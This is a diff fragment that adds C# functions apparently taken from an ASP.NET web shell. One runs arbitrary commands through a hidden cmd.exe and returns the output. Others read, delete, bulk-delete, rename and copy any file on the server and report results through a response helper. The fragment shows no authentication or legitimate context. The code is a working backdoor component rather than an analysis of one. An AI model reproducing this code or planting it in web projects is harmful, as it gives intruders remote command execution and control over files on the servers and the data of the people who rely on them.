@@ -1,0 +1,32 @@
+    string exec(string cmd){string pro="";System.Diagnostics.Process n=new System.Diagnostics.Process();n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);n.StartInfo.UseShellExecute=false;n.StartInfo.RedirectStandardInput=true;n.StartInfo.RedirectStandardOutput=true;n.StartInfo.RedirectStandardError=true;n.StartInfo.CreateNoWindow=true;string o=null;n.Start();n.StandardInput.WriteLine(cmd);n.StandardInput.WriteLine("exit");o=n.StandardOutput.ReadToEnd();n.WaitForExit();n.Close();return o;}
+    void gsize(string addr){string ret="Error : -";try{hasErrorInGetSize=false;long size=GetDirSize(new System.IO.DirectoryInfo(addr));ret=sizeFix(size);if(hasErrorInGetSize && sizelvl==0)ret=sizeError;else if(hasErrorInGetSize)ret="!"+ret;}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
+    void view(string path){string ret="You are viewing the contents of this file : "+path+Environment.NewLine;try{ret+=System.IO.File.ReadAllText(path);}catch(Exception ex){ret="Error : "+ex.Message;}response(HttpUtility.HtmlEncode(ret));}
+    void delete(string path){
+        string ret="Error : -";
+        try {
+            System.IO.File.Delete(path);
+            ret =string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly deleted{1}",path,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(path))));
+        } catch(Exception ex){
+            ret ="Error : "+ex.Message;
+        }
+        response(ret);
+    }
+    void multiDelete(string files)
+    {
+        string ret="Error : -";
+        try{
+
+            string[] f = files.Split('|');
+            ret = string.Format("All '{0}' files successfuly deleted.", f.Length);
+            foreach (string item in f)
+            {
+                System.IO.File.Delete(fb(item));
+            }
+
+        }catch (Exception ex){
+            ret ="Error : "+ex.Message;
+        }
+        response(ret);
+    }
+    void rename(string oldName,string newName){string ret="Error : -";try{if(newName.EndsWith("\\"))newName+=System.IO.Path.GetFileName(oldName);System.IO.File.Move(oldName,newName);ret=string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly moved to '{1}'{2}",oldName,newName,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(oldName))));}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
+    void copy(string oldName,string newName){string ret="Error : -";try{if(newName.EndsWith("\\"))newName+=System.IO.Path.GetFileName(oldName);System.IO.File.Copy(oldName,newName);ret=string.Format("{{\"message\":\"{0}\",\"dirInfo\":\"{1}\"}}",tb(string.Format("File '{0}' successfuly copied to '{1}'{2}",oldName,newName,Environment.NewLine)),tb(getDirectoryInfo(System.IO.Path.GetDirectoryName(oldName))));}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
